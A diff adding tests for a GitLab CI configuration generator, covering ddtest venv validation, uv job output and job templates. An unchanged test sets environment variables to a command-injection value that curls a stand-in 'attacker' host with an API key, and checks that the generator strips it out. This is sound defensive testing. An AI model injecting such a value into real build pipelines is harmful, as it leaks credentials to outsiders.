@@ -1,6 +1,7 @@
 """Tests for scripts/gen_gitlab_config.py."""
 
 import importlib.util
+import io
 import pathlib
 import sys
 import types
@@ -77,6 +78,56 @@ def test_jobspec_sanitizes_nightly_build_before_script(gen_gitlab_config_mod, mo
     assert "$DD_API_KEY" not in config
 
 
+def test_ddtest_requires_a_test_path_for_every_venv(gen_gitlab_config_mod):
+    info = gen_gitlab_config_mod.SuiteVenvInfo(
+        environment_hashes=("hash-with-path", "hash-without-path"),
+        python_versions={"3.12"},
+        environments=(("hash-with-path", "3.12"), ("hash-without-path", "3.12")),
+        ddtest_metadata={
+            "hash-with-path": ("first.txt", "tests/internal", "pytest tests/internal", ""),
+            "hash-without-path": ("second.txt", "", "pytest tests/internal", ""),
+        },
+    )
+
+    with pytest.raises(ValueError, match="hash-without-path"):
+        gen_gitlab_config_mod._ddtest_module().validate_ddtest_venv_test_locations(
+            "internal",
+            info.environments,
+            {environment_hash: metadata[1] for environment_hash, metadata in info.ddtest_metadata.items()},
+        )
+
+
+def test_ddtest_uv_jobs_preserve_the_suite_command(gen_gitlab_config_mod):
+    output = io.StringIO()
+    ddtest_jobs = gen_gitlab_config_mod._ddtest_module()
+    metadata = {
+        "uv123": (
+            ".riot/requirements/uv123.txt",
+            "tests/tracer/**/test*.py",
+            "pytest -v --ignore=tests/tracer/test_uwsgi_shutdown.py tests/tracer/",
+            "PYTHONOPTIMIZE=1",
+        )
+    }
+
+    ddtest_jobs.emit_ddtest_jobs(
+        output,
+        suite="tracer",
+        stage="core",
+        clean_name="tracer",
+        config={"env": {}},
+        environments=[("uv123", "3.12")],
+        k=1,
+        metadata=metadata,
+        wait_lockfile=".riot/requirements/wait.txt",
+    )
+
+    content = output.getvalue()
+    assert "extends: .ddtest_plan_uv" in content
+    assert "extends: .ddtest_run_uv" in content
+    assert "DDTEST_UV_COMMAND_uv123: pytest -v --ignore=tests/tracer/test_uwsgi_shutdown.py tests/tracer/" in content
+    assert "DDTEST_UV_ENV_uv123: PYTHONOPTIMIZE=1" in content
+
+
 def test_build_base_venvs_template_gets_sanitized_bool_values(gen_gitlab_config_mod, monkeypatch, tmp_path):
     monkeypatch.setenv("NIGHTLY_BUILD", "$(curl attacker/$DD_API_KEY)")
     monkeypatch.setenv("UNPIN_DEPENDENCIES", "$(curl attacker/$DD_API_KEY)")
@@ -91,3 +142,39 @@ def test_build_base_venvs_template_gets_sanitized_bool_values(gen_gitlab_config_
     assert 'if [[ "false" == "true" ]]' in config
     assert "$(curl" not in config
     assert "$DD_API_KEY" not in config
+
+
+def test_migrated_jobs_use_uv_environments(gen_gitlab_config_mod):
+    environment_hashes = ("first", "second", "third")
+    config = str(
+        gen_gitlab_config_mod.JobSpec(
+            name="tracer",
+            stage="core",
+            suite="tracer",
+            parallelism=2,
+            python_versions={"3.10", "3.11"},
+            environment_hashes=environment_hashes,
+        )
+    )
+
+    assert "  extends: .test_base" in config
+    assert "    TEST_SUITE: tracer" in config
+    configured_hashes = {
+        environment_hash
+        for line in config.splitlines()
+        if line.strip().startswith("TEST_ENVIRONMENTS_")
+        for environment_hash in line.rsplit('"', 2)[1].split()
+    }
+    assert configured_hashes == set(environment_hashes)
+
+
+def test_migrated_snapshot_job_uses_defined_base(gen_gitlab_config_mod):
+    with mock.patch.object(gen_gitlab_config_mod, "_wait_lockfile", return_value=".riot/requirements/wait.txt"):
+        config = str(
+            gen_gitlab_config_mod.JobSpec(name="requests", stage="contrib", suite="contrib::requests", snapshot=True)
+        )
+    extends = next(line.removeprefix("  extends: ") for line in config.splitlines() if line.startswith("  extends: "))
+    test_templates = (gen_gitlab_config_mod.GITLAB / "tests.yml").read_text()
+
+    assert extends == ".test_base_snapshot"
+    assert f"{extends}:" in test_templates
